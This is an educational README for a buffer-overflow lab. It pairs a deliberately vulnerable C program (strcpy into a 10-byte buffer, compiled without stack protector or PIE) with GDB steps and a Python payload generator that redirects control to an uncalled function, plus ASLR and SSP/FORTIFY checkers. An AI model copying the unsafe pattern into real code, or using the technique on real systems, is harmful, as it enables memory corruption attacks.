# buffer_overflower

This repository is for verifying Stack Buffer Overflow Vulnerabilities.
[Japanse Version](/README_ja.md)

## Prerequisites

ASLR (Address Space Layout Randomization):  
A feature that randomizes memory addresses. Disabling this is necessary because the address of `function2` changes each time, making it difficult to jump to a specific address.

## Basics of Buffer Overflow Attacks: Calling Functions Using `overflow.c` and `exploit.txt`

This guide explains how to exploit a stack-based buffer overflow vulnerability to call a function that should not normally be called.

-----

### 1\. Objective

Call `function2`, which is not directly called from the `main` function, by exploiting a **stack buffer overflow** that occurs in `function1`.

-----

### 2\. Creating the Vulnerable C Program `overflow.c`

First, create a C language program with an intentional buffer overflow vulnerability.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Function not directly called from main
void function2() {
    printf("Function 2 called!\n");
    // Cleanly exit the program after a successful attack
    // Without this, the return destination from function2 will be invalid, resulting in a Segmentation Fault
    exit(0); 
}

// Function with a buffer overflow vulnerability
// This function is called from main, and the payload is passed to it
void function1(char *input) {
    char buffer[10]; // Intentionally small buffer
    printf("Function 1 entered.\n");
    // !!! Intentionally use the dangerous strcpy !!!
    // If the data in input exceeds the size of buffer (10 bytes),
    // it will overwrite other data on the stack (especially the return address)
    strcpy(buffer, input); 
    // This printf may be executed even if the return address is overwritten
    printf("Function 1 returned normally\n"); 
}

int main() {
    char input[100]; // Buffer to read the payload
    printf("Enter input: ");
    // Read the payload from standard input
    scanf("%s", input);
    // Call the vulnerable function and pass the payload
    function1(input);
    return 0;
}
```

**Explanation:**

* **`function2()`**:  
  This function is not directly called from the `main` function, but it is the target function you want to call through the attack. Including `exit(0)` prevents a segmentation fault after a successful attack and allows the program to terminate normally.

* **`function1(char *input)`**:  
  This function is the core of the vulnerability. `buffer` is only 10 bytes, but `strcpy` copies the contents of `input` to `buffer` beyond the buffer size. This can overwrite the **return address** of `function1` on the stack.

* **`main()`**:  
  Calls `function1`.

-----

### 3\. Compiling `overflow.c`

To successfully execute a buffer overflow attack, you need to disable certain security protections during compilation.

```bash
gcc -g -fno-stack-protector -no-pie -o overflow overflow.c
```

**Explanation of Compilation Options:**

* **`-g`**:  
  Includes symbol information for debugging with GDB (GNU Debugger). This allows you to check the memory state using variable and function names.

* **`-fno-stack-protector`**:  
  Disables the **Stack Smashing Protector (SSP)**, also known as **stack canaries**. If this is enabled, it will detect the buffer overflow and terminate the program abnormally.

* **`-no-pie`**:  
  Disables **PIE (Position Independent Executable)**. If PIE is enabled, the memory address is randomized each time the program starts, making it very difficult to identify the address to use for the attack. Disabling it fixes the address, making the attack easier.

-----

### 4\. How to Create `exploit.txt`

`exploit.txt` describes the **payload** to overwrite the return address of `function1` with the address of `function2`. This requires the following information:

1. **Offset from the buffer to the return address:** The number of bytes from the start of `buffer` in `function1` to the location on the stack where the address to return to after `function1` finishes is stored.
2. **Address of `function2`:** The address where `function2` is loaded in memory.

This information is identified by debugging the program using GDB.

#### 4.1. Identifying the Offset and Address Using GDB

1. **Start `overflow` in GDB:**

    ```bash
    gdb -q overflow
    ```

2. **Set a breakpoint at the start of `function1` and run with short input:**

    ```gdb
    (gdb) b function1
    (gdb) r
    Starting program: .../overflow
    Enter input: AAAA
    ```

3. **Check the address of `buffer`:**

    ```gdb
    (gdb) p &buffer
    $1 = (char (*)[10]) 0x7fffffffd886  # Example: This address varies depending on the environment
    ```

    (Note the address of `buffer` in your environment)

4. **Check the stack frame information of `function1` and identify the location of the return address:**

    ```gdb
    (gdb) info frame
    Stack level 0, frame at 0x7fffffffd8a0:
     rip = 0x4011a2 in function1 (...); saved rip = 0x4011f7 # <- This is important
     ...
     Saved registers:
      rbp at 0x7fffffffd890, rip at 0x7fffffffd898 # <- Location where the return address is saved
    ```

    The address indicated by `rip at` in `Saved registers:` is the location where the return address is saved. In this example, it is `0x7fffffffd898`.

5. **Calculate the offset:**
    Calculate `Location of return address - Address of buffer`.
    Example: `0x7fffffffd898 - 0x7fffffffd886 = 18` bytes
    This **18 bytes** is the offset in your environment.

6. **Check the address of `function2`:**

    ```gdb
    (gdb) p function2
    $2 = {void ()} 0x401156 <function2> # Example: This address varies depending on the environment
    ```

    (Note the address of `function2` in your environment)

Now you have identified the `offset` and the address of `function2`, e.g., `0x401156`.

#### 4.2. Generating `exploit.txt` with a Python Script

Use the identified offset and address to generate a binary payload with a Python script.

```python
import struct

# Replace with the offset and function2 address identified in GDB!
OFFSET = 18            # Offset in your environment (e.g., 18 bytes)
FUNC2_ADDR = 0x401156  # Address of function2 in your environment (e.g., 0x401156)

# Payload construction:
# 1. Dummy data for the offset (e.g., 'A')
# 2. Followed by the address of function2 (8 bytes in little-endian format)
payload = b'A' * OFFSET 
payload += struct.pack('<Q', FUNC2_ADDR) # '<Q' is unsigned long long (8 bytes) in little-endian

# Write to exploit.txt (binary mode 'wb')
with open('exploit.txt', 'wb') as f:
    f.write(payload)

print(f"Payload generated: {len(payload)} bytes")
print(f"Content (first 30 bytes for preview): {payload[:30]}")
```

Running this script generates a binary file named `exploit.txt`.

-----

### 5\. Executing the Attack

Execute the generated `exploit.txt` by redirecting it to the standard input of the `overflow` program.

```bash
./overflow < exploit.txt
```

#### Expected Execution Result

If the attack is successful, you should get the following output:

```bash
Enter input: Function 1 returned normally
Function 2 called!
```

**Explanation:**

* `Enter input:` is from the `printf` in the `main` function.

* `Function 1 returned normally` indicates that the `strcpy` in `function1` was executed, the `printf` statement was executed, and then control was passed to the overwritten return address.

* If `Function 2 called!` is displayed, it means that `function2` was successfully called by the buffer overflow. The program then terminates normally due to `exit(0)` in `function2`.

-----

This completes the basic buffer overflow attack procedure using `overflow.c`. Through this exercise, you can deeply understand the stack mechanism, function calling conventions, and the basics of how to exploit buffer overflows.

## Various Verification Tools

### ASLR (Address Space Layout Randomization) Auto-Detection Tool: `check_aslr.py`

#### 1.1. Objective

`check_aslr.py` is a Python script that automatically determines whether **ASLR (Address Space Layout Randomization)** is enabled on a Linux system. ASLR is a security feature that makes attacks such as buffer overflows more difficult by randomizing the addresses of programs in memory.

#### 1.2. Determination Method

This script determines the ASLR status by combining the following two methods:

1. **Reading `/proc/sys/kernel/randomize_va_space`:**
    * Directly reads the value of `/proc/sys/kernel/randomize_va_space`, which is a Linux kernel configuration file. This value indicates the ASLR enable level and is the most reliable source of information.
      * `0`: ASLR is disabled.
      * `1`: ASLR is partially enabled (stack, mmap regions, and VDSO are randomized).
      * `2`: ASLR is fully enabled (stack, heap, mmap regions, and VDSO are all randomized).
2. **Dynamic Address Randomization Check:**
    * Automatically compiles a very simple C language test program and executes it multiple times.
    * For each execution, it extracts the program's **stack address** and **heap address** and checks whether these addresses change with each execution.
    * If the addresses change, it infers that ASLR is enabled; if they do not change, it infers that it is disabled. This method is a supplementary check, and accurate results may not be obtained depending on the environment and compilation options.

#### 1.3. Execution Method

1. Grant execute permissions to `check_aslr.py` (optional, but recommended).

     ```bash
     chmod +x check_aslr.py
     ```

2. Execute in the terminal.

     ```bash
     python3 check_aslr.py
     ```

#### 1.4. Example Execution Results

In Linux:

```bash
--- ASLR Determination via /proc/sys/kernel/randomize_va_space ---
Value of '/proc/sys/kernel/randomize_va_space': 2
ASLR is fully enabled (2: Full randomization, recommended).

--- ASLR Inference via Address Randomization (running 5 times) ---
Stack address randomization: Enabled
Heap address randomization: Enabled
Address randomization observed. ASLR is likely enabled.

--- Note ---
The value of '/proc/sys/kernel/randomize_va_space' is the most reliable source of information.
Address randomization checks may vary depending on compilation options and OS behavior.
```

In Windows:

```powershell
--- ASLR Determination via /proc/sys/kernel/randomize_va_space ---
Error: '/proc/sys/kernel/randomize_va_space' not found. This may not be a Linux system or the kernel version may be too old.

--- ASLR Inference via Address Randomization (running 5 times) ---
Stack address randomization: Enabled
Heap address randomization: Enabled
Address randomization observed. ASLR is likely enabled.

--- Note ---
The value of '/proc/sys/kernel/randomize_va_space' is the most reliable source of information.
Address randomization checks may vary depending on compilation options and OS behavior.
```

## 2. Security Mechanism Effectiveness Determination Tool: `check_security_features.py`

### 2.1. Objective

`check_security_features.py` is a Python script that automatically determines whether **SSP (Stack Smashing Protector)** and **Automatic Fortification (FORTIFY\_SOURCE)** are effectively functioning on the system. These features protect programs from memory-related vulnerabilities such as buffer overflows.

### 2.2. Determination Method

This script determines the effectiveness of each security feature by compiling a C language test program that intentionally causes a buffer overflow with compilation options corresponding to the enabled/disabled state of each security feature, and then analyzing the execution results (exit code and standard error output).

* **SSP (Stack Smashing Protector):**
  * **If enabled:**
     Places a **canary value** on the stack. If the canary is overwritten by a buffer overflow, it detects this before the function returns and abnormally terminates the program with a message like `*** stack smashing detected ***` (usually `SIGABRT`, exit code `134`).
  * **If disabled:**
     Since the canary is not inserted, the buffer overflow directly overwrites the **return address, etc.** without being hindered by the canary, and the program usually crashes with `SIGSEGV` (exit code `139`).

* **Automatic Fortification (FORTIFY\_SOURCE):**
  * **If enabled:**
     Replaces dangerous function calls like `strcpy` with **safe versions with boundary checks** at compile time. This can issue warnings/errors at compile time in places where buffer overflows are possible, or abnormally terminate the program at runtime with a message like `buffer overflow detected` (usually `SIGABRT`, exit code `134`).
  * **If disabled:**
     Dangerous functions are used as is, and boundary checks are not performed. The buffer overflow usually crashes with `SIGSEGV` (exit code `139`).

### 2.3. Execution Method

1. Grant execute permissions to `check_security_features.py` (optional, but recommended).

     ```bash
     chmod +x check_security_features.py
     ```

2. Execute in the terminal.

     ```bash
     python3 check_security_features.py
     ```

### 2.3. Example Execution Results

```bash
--- Security mechanism effectiveness determination program ---
This program tests the effectiveness of SSP and FORTIFY_SOURCE.
gcc compiler must be installed.

=== SSP (Stack Smashing Protector) determination ===
  Compiling: ./ssp_enabled_test (options: -fstack-protector-all -no-pie)
  Compilation successful: ./ssp_enabled_test
  Running: ./ssp_enabled_test
  Exit code: -6
  stdout:

  stderr:
*** stack smashing detected ***: terminated
  Result: SSP is likely enabled (stack smashing detected message or SIGABRT).
  Compiling: ./ssp_disabled_test (options: -fno-stack-protector -no-pie)
  Compilation successful: ./ssp_disabled_test
  Running: ./ssp_disabled_test
  Exit code: 0
  stdout:
Enter input: Function 1 returned normally
Function 2 called!
  stderr:

  Result: Despite SSP being disabled, the expected SIGSEGV did not occur (exit code: 0).

=== Automatic Fortification (FORTIFY_SOURCE) determination ===
  Compiling: ./fortify_enabled_test (options: -D_FORTIFY_SOURCE=2 -no-pie)
  Compilation successful: ./fortify_enabled_test
  Running: ./fortify_enabled_test
  Exit code: 0
  stdout:
Enter input: Function 1 returned normally
Function 2 called!
  stderr:

  Result: FORTIFY_SOURCE is disabled or not detecting as expected (exit code: 0).
  Compiling: ./fortify_disabled_test (options: -no-pie)
  Compilation successful: ./fortify_disabled_test
  Running: ./fortify_disabled_test
  Exit code: 0
  stdout:
Enter input: Function 1 returned normally
Function 2 called!
  stderr:

  Result: Despite FORTIFY_SOURCE being disabled, the expected SIGSEGV did not occur (exit code: 0).

=== Final verdict ===
→ **SSP (Stack Smashing Protector) appears to be functioning properly.**
→ **The status of Automatic Fortification (FORTIFY_SOURCE) is unknown or unstable.**
```
